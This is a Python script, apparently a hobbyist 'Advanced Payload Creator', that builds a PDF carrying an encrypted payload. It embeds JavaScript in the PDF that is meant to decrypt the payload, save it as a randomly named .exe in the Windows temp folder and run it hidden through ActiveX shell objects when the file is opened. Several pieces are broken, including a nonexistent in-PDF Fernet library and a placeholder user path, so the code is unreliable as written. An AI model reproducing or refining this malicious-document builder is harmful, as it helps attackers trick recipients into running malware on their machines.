import base64
import os
import time
import random
import string
from cryptography.fernet import Fernet
from PyPDF2 import PdfWriter, PdfReader
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from io import BytesIO
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn
from rich.prompt import Prompt
from rich.table import Table
from rich.panel import Panel

# Initialize Rich Console
console = Console()

# Generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Encrypt the payload
def encrypt_payload(payload, key):
    cipher = Fernet(key)
    encrypted_payload = cipher.encrypt(payload)
    return encrypted_payload

# Generate a random file name
def random_filename(extension=".exe"):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + extension

# Create a PDF with embedded payload
def create_advanced_pdf(output_pdf_path, encrypted_payload, key):
    buffer = BytesIO()

    # Create a PDF with ReportLab
    c = canvas.Canvas(buffer, pagesize=letter)
    c.drawString(100, 750, "This PDF contains an advanced payload.")
    c.save()

    # Get the PDF data from the buffer
    buffer.seek(0)
    new_pdf = PdfReader(buffer)

    # Create a PdfWriter object
    output_pdf = PdfWriter()
    output_pdf.add_page(new_pdf.pages[0])

    # Enhanced JavaScript to execute payload
    js_code = f"""
    var key = "{base64.urlsafe_b64encode(key).decode()}";
    var payload = "{base64.urlsafe_b64encode(encrypted_payload).decode()}";

    function decryptPayload(encryptedPayload, key) {{
        var keyBytes = new Uint8Array(atob(key).split("").map(c => c.charCodeAt(0)));
        var cipher = new fernet.Fernet(keyBytes);
        return cipher.decrypt(encryptedPayload);
    }}

    function executePayload() {{
        try {{
            var decryptedPayload = decryptPayload(payload, key);
            var fileStream = new ActiveXObject("ADODB.Stream");
            fileStream.Type = 1; // Binary
            fileStream.Open();
            fileStream.Write(decryptedPayload);
            var tempPath = "C:\\Users\\YourUsername\\AppData\\Local\\Temp\\" + generateRandomFileName();
            fileStream.SaveToFile(tempPath, 2); // Save as overwrite
            fileStream.Close();
            
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run(tempPath, 0);
            console.log("Payload executed successfully.");
        }} catch (e) {{
            console.log("Error executing payload: " + e.message);
        }}
    }}

    function generateRandomFileName() {{
        var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        var randomFileName = "";
        for (var i = 0; i < 10; i++) {{
            randomFileName += chars.charAt(Math.floor(Math.random() * chars.length));
        }}
        return randomFileName + ".exe";
    }}

    executePayload();
    """
    output_pdf.add_js(js_code)

    # Write the final PDF to file
    with open(output_pdf_path, "wb") as f:
        output_pdf.write(f)

def main():
    # Interactive TUI
    console.print(Panel("[bold green]Advanced Payload Creator[/bold green]", style="bold magenta", title="Welcome"))
    time.sleep(1)
    
    # Ask user for input
    payload_message = Prompt.ask("[yellow]Enter a custom message for the payload[/yellow]")
    output_pdf_name = Prompt.ask("[cyan]Enter the name for the output PDF file (with .pdf extension)[/cyan]", default="advanced_payload.pdf")
    
    console.print(f"[cyan]Creating payload with message:[/cyan] {payload_message}")
    
    # Example payload
    payload = payload_message.encode()
    key = generate_key()
    encrypted_payload = encrypt_payload(payload, key)
    
    # Rich TUI for progress
    with Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3}%"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Creating PDF...", total=100)
        
        # Create the advanced PDF with encrypted payload
        create_advanced_pdf(output_pdf_name, encrypted_payload, key)
        progress.update(task, advance=100)
    
    # Display final message
    console.print(Panel("[bold green]PDF created successfully with the embedded payload.[/bold green]", style="bold magenta"))

    # Display final payload details in a table
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Property", style="dim")
    table.add_column("Value")
    
    table.add_row("Payload Message", payload_message)
    table.add_row("Encrypted Payload (Base64)", base64.urlsafe_b64encode(encrypted_payload).decode())
    table.add_row("Encryption Key (Base64)", base64.urlsafe_b64encode(key).decode())
    table.add_row("Output PDF File", output_pdf_name)
    
    console.print(table)

if __name__ == "__main__":
    main()

